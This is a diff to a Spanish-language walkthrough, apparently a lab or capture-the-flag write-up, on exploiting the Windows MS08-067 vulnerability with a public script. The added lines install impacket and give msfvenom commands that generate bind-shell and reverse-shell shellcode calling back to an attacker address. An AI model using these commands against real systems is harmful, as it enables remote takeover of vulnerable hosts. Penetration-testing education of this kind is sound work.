@@ -109,10 +109,18 @@ Debemos validar esta información, ya que puede estar parcheada.
 Nos fijamos como objetivo atacar a la **vuln MS08-067**
 Googleamos en busca de un exploit, encontramos este [https://github.com/andyacer/ms08_067](https://github.com/andyacer/ms08_067)
 
-Antes de hacer uso del script, debemos seguir las instrucción que nos indican
+Antes de hacer uso del script, necesitamos tener instalado impacket.
 ```
 git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
 cd impacket
 pip install .
+```
+El siguiente paso será generar una **shellcode**, con el objetivo de obtener una conexión reversa hacía nuestro equipo.
+```
+msfvenom -p windows/shell_bind_tcp RHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+
+msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+
+msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
 ```
 
